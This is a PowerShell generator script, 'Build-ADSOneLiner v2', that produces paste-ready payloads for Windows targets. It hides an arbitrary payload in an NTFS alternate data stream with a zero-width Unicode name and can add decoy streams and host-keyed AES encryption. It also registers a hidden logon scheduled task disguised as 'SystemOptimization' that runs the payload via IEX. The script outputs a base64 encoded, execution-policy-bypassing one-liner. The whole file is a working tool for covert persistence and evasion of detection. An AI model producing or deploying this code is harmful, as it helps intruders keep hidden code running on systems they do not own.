<#
.SYNOPSIS
    Build-ADSOneLiner v2 - Simplified, minimal-footprint generator

.DESCRIPTION
    Pre-computes everything on Linux, sends minimal code to Windows.
    No unnecessary function definitions on target.

.PARAMETER Payload
    Payload content (required unless -PayloadAtDeployment)

.PARAMETER PayloadAtDeployment
    Prompt for payload on Windows target

.PARAMETER ZeroWidthMode
    'single', 'multi', or 'hybrid'

.PARAMETER HybridPrefix
    Prefix for hybrid mode

.PARAMETER Persist
    'task', 'registry', 'wmi', 'none'

.PARAMETER CreateDecoys
    Number of decoy streams (0-10)

.PARAMETER Encrypt
    Enable AES-256 encryption

.PARAMETER Randomize
    Randomize host file name

.PARAMETER OutputFile
    Where to save payload (default: ads-payload.txt)

.PARAMETER ManifestDir
    Manifest directory on Linux (default: ./manifests)
#>

[CmdletBinding()]
param(
    [string]$Payload,
    [switch]$PayloadAtDeployment,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateSet('task', 'registry', 'wmi', 'none')]
    [string]$Persist = 'task',
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [switch]$Encrypt,
    [switch]$Randomize,
    
    [string]$OutputFile = "ads-payload.txt",
    [string]$ManifestDir = "./manifests"
)

Write-Host "`n═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host " ADS One-Liner Generator v2 (Optimized)" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════════════`n" -ForegroundColor Cyan

# Validate
if (-not $Payload -and -not $PayloadAtDeployment) {
    Write-Error "Provide -Payload or use -PayloadAtDeployment"
    exit 1
}

#region Pre-Compute on Linux

Write-Host "[*] Pre-computing configuration on Linux..." -ForegroundColor White

# Zero-width character set
$zwChars = @(0x061C,0x180E,0x200B,0x200C,0x200D,0x200E,0x200F,0x202A,0x202B,0x202C,0x202D,0x202E,0x2060,0xFEFF)

# Generate stream name HERE on Linux
$streamName = switch ($ZeroWidthMode) {
    'single' {
        [char]($zwChars | Get-Random)
    }
    'multi' {
        -join (1..3 | ForEach-Object { [char]($zwChars | Get-Random) })
    }
    'hybrid' {
        $prefix = if ($HybridPrefix) { $HybridPrefix } else { 'Zone.Identifier' }
        $suffix = [char]($zwChars | Get-Random)
        "$prefix$suffix"
    }
}

# Get codepoints for manifest
$streamChars = $streamName.ToCharArray()
$codepoints = ($streamChars | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '

# Convert stream name to Unicode escape sequence for embedding
# This ensures it survives string interpolation
$streamNameEscaped = -join ($streamChars | ForEach-Object {
    "\u{0:X4}" -f [int]$_
})

# Generate host path
$hostPath = if ($Randomize) {
    'C:\ProgramData\' + (-join ((65..90)+(97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })) + '.dat'
} else {
    'C:\ProgramData\SystemCache.dat'
}

# Generate decoy names if needed
$decoyNames = @()
if ($CreateDecoys -gt 0) {
    $availableDecoys = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
    $decoyContent = @("[ZoneTransfer]`r`nZoneId=3", 'Document summary', 'Internal use only')
    
    for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $availableDecoys.Count); $i++) {
        $decoyNames += @{
            Name = $availableDecoys[$i]
            Content = $decoyContent | Get-Random
        }
    }
}

Write-Host "[+] Configuration complete" -ForegroundColor Green
Write-Host "    Host: $hostPath" -ForegroundColor Gray
Write-Host "    Stream: <zero-width> (Codepoints: $codepoints)" -ForegroundColor Gray
Write-Host "    Decoys: $CreateDecoys" -ForegroundColor Gray

#endregion

#region Build Minimal Windows Payload

Write-Host "[*] Building minimal Windows payload..." -ForegroundColor White

if ($Encrypt) {
    # If encryption needed, we DO need minimal functions
    $minimalCode = @"
# Host-derived AES key
`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join'|'
`$k=[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))

# Encrypt function
function enc(`$t,`$k){`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.GenerateIV();`$e=`$a.CreateEncryptor();`$p=[Text.Encoding]::UTF8.GetBytes(`$t);`$b=`$e.TransformFinalBlock(`$p,0,`$p.Length);[Convert]::ToBase64String(`$a.IV+`$b)}

# Decrypt function
function dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)}
"@
} else {
    $minimalCode = ""
}

# Main deployment code
$deployCode = @"
$minimalCode

# Config
`$hp='$hostPath'
`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))
"@

if ($PayloadAtDeployment) {
    $deployCode += @"

`$pl=Read-Host 'Enter payload'
"@
} else {
    $escapedPayload = $Payload -replace "'","''" -replace '\\','\\'
    $deployCode += @"

`$pl='$escapedPayload'
"@
}

# Encryption handling
if ($Encrypt) {
    $deployCode += @"

`$pl=enc `$pl `$k
"@
}

# Create host file and write ADS
$deployCode += @"

if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
`$pl|sc ("`$hp`:"+`$sn) -Force
"@

# Add decoys
if ($CreateDecoys -gt 0) {
    foreach ($decoy in $decoyNames) {
        $deployCode += @"

'$($decoy.Content)'|sc "`$hp`:$($decoy.Name)" -Force
"@
    }
}

# Persistence
if ($Persist -eq 'task') {
    if ($Encrypt) {
        $loaderCmd = "```$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join'|'));function dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};IEX(dec (gc '`$hp`:'+[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" })) -Raw) ```$k)"
    } else {
        $loaderCmd = "IEX(gc '`$hp`:'+[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" })) -Raw)"
    }
    
    $deployCode += @"

`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-W Hidden -NoP -C `"$loaderCmd`""
`$t=New-ScheduledTaskTrigger -AtLogOn
`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
Register-ScheduledTask -TaskName 'SystemOptimization' -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
"@
}

$deployCode += @"

Write-Host '[+] Deployment complete' -ForegroundColor Green
"@

#endregion

#region Generate Outputs

Write-Host "[*] Generating output formats..." -ForegroundColor White

# Base64 encode
$bytes = [System.Text.Encoding]::Unicode.GetBytes($deployCode)
$encoded = [Convert]::ToBase64String($bytes)

# Build output file
$output = @"
═══════════════════════════════════════════════════════════════
 ADS Deployment Payload (v2 - Optimized)
 Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
═══════════════════════════════════════════════════════════════

CONFIGURATION:
  Host File: $hostPath
  Stream Name: <zero-width>
  Codepoints: $codepoints
  Zero-Width Mode: $ZeroWidthMode
  Persistence: $Persist
  Decoys: $CreateDecoys
  Encryption: $Encrypt
  Randomized: $Randomize
  
PAYLOAD SIZE:
  Readable: $($deployCode.Length) characters
  Encoded: $($encoded.Length) characters

═══════════════════════════════════════════════════════════════
 OPTION 1: Base64 Encoded One-Liner
═══════════════════════════════════════════════════════════════

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded

═══════════════════════════════════════════════════════════════
 OPTION 2: Readable Multi-Line Version
═══════════════════════════════════════════════════════════════

$deployCode

═══════════════════════════════════════════════════════════════
 USAGE:
═══════════════════════════════════════════════════════════════

1. Copy OPTION 1 or OPTION 2
2. Paste into PowerShell on Windows target
3. Press Enter
$(if ($PayloadAtDeployment) { "4. Enter payload when prompted" })

═══════════════════════════════════════════════════════════════
 CLEANUP:
═══════════════════════════════════════════════════════════════

# Remove ADS (using codepoints from manifest)
`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))
Remove-Item "$hostPath`:"+`$sn -Force

# Remove task
Unregister-ScheduledTask -TaskName 'SystemOptimization' -Confirm:`$false

# Remove host file
Remove-Item '$hostPath' -Force

═══════════════════════════════════════════════════════════════
"@

$output | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
Write-Host "[+] Payload saved to: $OutputFile" -ForegroundColor Green

#endregion

#region Save Manifest

if (-not $PayloadAtDeployment) {
    Write-Host "[*] Saving manifest..." -ForegroundColor White
    
    if (-not (Test-Path $ManifestDir)) {
        New-Item -Path $ManifestDir -ItemType Directory -Force | Out-Null
    }
    
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $manifestFile = Join-Path $ManifestDir "manifest-$timestamp.json"
    
    $manifest = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
        HostPath = $hostPath
        StreamName = $streamName
        Codepoints = $codepoints
        StreamNameEscaped = $streamNameEscaped
        ByteSequence = -join ($streamChars | ForEach-Object { "0x{0:X2} " -f [int]$_ })
        ZeroWidthMode = $ZeroWidthMode
        Persistence = $Persist
        Encrypted = $Encrypt.IsPresent
        DecoysCount = $CreateDecoys
        PayloadHash = if ($Payload) {
            (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
        } else { "N/A (runtime payload)" }
        Operator = $env:USER
        GeneratedOn = hostname
        OutputFile = $OutputFile
        RecoveryCommand = "`$sn=[char]0x$($streamChars[0].ToString('X4'))$(-join ($streamChars[1..($streamChars.Length-1)] | ForEach-Object { "+[char]0x$($_.ToString('X4'))" }))"
    }
    
    $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
    
    Write-Host "[+] Manifest saved to: $manifestFile" -ForegroundColor Green
}

#endregion

#region Summary

Write-Host "`n═══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host " SUMMARY" -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════════════`n" -ForegroundColor Cyan

Write-Host "✓ Minimal payload generated (no unnecessary functions)" -ForegroundColor Green
Write-Host "✓ Stream name pre-computed on Linux" -ForegroundColor Green
Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
if (-not $PayloadAtDeployment) {
    Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
}

Write-Host "`nREADY TO DEPLOY!" -ForegroundColor Magenta
Write-Host "Copy-paste to Windows target and execute.`n" -ForegroundColor White

#endregion
